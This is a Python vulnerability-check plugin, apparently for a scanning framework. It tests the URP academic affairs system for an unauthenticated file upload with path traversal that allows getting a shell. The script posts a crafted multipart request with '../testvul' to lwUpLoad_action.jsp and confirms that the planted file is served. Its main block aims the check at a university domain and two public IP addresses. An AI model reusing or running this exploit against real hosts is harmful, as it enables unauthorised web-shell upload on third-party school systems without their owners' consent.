#!/usr/bin/env python
# -*- coding: utf-8 -*-
#URP教务系统无需登录get shell
#author: yichin
#refer: http://www.wooyun.org/bugs/wooyun-2010-075251
#refer: http://www.wooyun.org/bugs/wooyun-2010-095920

import  re

def assign(service, arg):
    if service == "urp":
        return True, arg

def audit(arg):
    url = arg + 'lwUpLoad_action.jsp'
    code, head, res, errcode, _ = curl.curl(url)
    if code == 404:
        #security_note('lwUpLoad_action.jsp at '+arg+ ' has been deleted.')
        pass
    else:
        #文件上传
        postData = '------WebKitFormBoundaryJXJgj6MiAAHumixA\r\n\
Content-Disposition: form-data; name=\\"theFile\\"; filename=\\"testvul.txt\\"\r\n\
Content-Type: text/plain\r\n\r\n\
testvul\r\n\
------WebKitFormBoundaryJXJgj6MiAAHumixA\r\n\
Content-Disposition: form-data; name=\\"xh\\"\r\n\r\n\
../testvul\r\n\
------WebKitFormBoundaryJXJgj6MiAAHumixA--\r\n'
        userAgent = 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36'
        contentType = 'Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJXJgj6MiAAHumixA'
        curlArg = '-H "' +contentType+ '" -d "' +postData+ '" -A "' +userAgent+ '" ' +url
        code, head, res, errcode, _ = curl.curl(curlArg)
        #验证
        code, head, res, errcode, _ = curl.curl(arg+'testvul.txt')
        if code == 200 and "testvul" in res:
            security_hole('get shell: ' + url)
        else:
            pass
        

if __name__ == '__main__':
    from dummy import *
    audit(assign('urp', 'http://jwxt.bibt.edu.cn/')[1])
    audit(assign('urp', 'http://202.118.88.140/')[1])
    audit(assign('urp', 'http://219.148.85.172:9080/')[1])
